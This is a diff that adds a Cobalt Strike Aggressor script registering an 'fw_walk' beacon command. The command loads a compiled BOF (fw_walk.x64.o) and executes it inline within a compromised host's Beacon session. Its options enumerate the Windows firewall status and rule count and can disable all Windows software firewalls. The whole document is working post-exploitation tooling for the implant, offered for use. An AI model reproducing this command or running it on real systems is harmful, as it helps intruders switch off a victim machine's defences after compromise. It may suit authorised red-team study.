@@ -1,0 +1,62 @@
+beacon_command_register(
+"fw_walk",
+"Firewall walker",
+"Synopsis: fw_walk");
+
+alias fw_walk {
+    local('$handle $args $data');
+    local('$helpString');
+
+    $helpString =  "\n";
+    $helpString =  $helpString . "fw_walk [options]\n";
+    $helpString =  $helpString . "=====================================\n";
+    $helpString =  $helpString . "Options:\n\n";
+    $helpString =  $helpString . "status\n";
+    $helpString =  $helpString . "Description: enumerates public, domain, and profile firewall settings.\n";
+    $helpString =  $helpString . "=====================================\n";
+    $helpString =  $helpString . "total\n";
+    $helpString =  $helpString . "Description: Get count of total discovered Windows firewall rules.\n";
+    $helpString =  $helpString . "=====================================\n";
+    $helpString =  $helpString . "disable_fw\n";
+    $helpString =  $helpString . "Description: Disable public, domain, and profile firewall(s).\n";
+    $helpString =  $helpString . "=====================================\n";
+    $helpString =  $helpString . "enable_fw\n";
+    $helpString =  $helpString . "Description: Enable public, domain, and profile firewall(s).\n";
+
+    if ( size(@_) == 1 ) {
+        berror($1, $helpString);
+        return;
+    }
+
+    if (-is64 $1) {
+        $handle = openf(script_resource("fw_walk.x64.o"));
+    
+        $data = readb($handle, -1);
+        closef($handle);
+
+        if ( $2 ismatch "(?i)(status|total|disable|enable)") {
+            if ( $2 ismatch "(?i)(status)") {
+                beacon_inline_execute($1, $data, "GetFWStatus");
+                return;
+            }
+            if ( $2 ismatch "(?i)(total)") {
+                beacon_inline_execute($1, $data, "GetNumberOfRules");
+                return;
+            }
+            if ( $2 ismatch "(?i)(disable)") {
+                beacon_inline_execute($1, $data, "DisableAllWindowsSoftwareFirewalls");
+                return;
+            }
+            if ( $2 ismatch "(?i)(enable)") {
+                beacon_inline_execute($1, $data, "EnableAllWindowsSoftwareFirewalls");
+                return;
+            }
+        } else {
+            berror($1, $helpString);
+            return;
+        }
+    } else {
+        berror($1, "This is currently meant to work with x64 sessions at the moment.");
+    }
+
+}
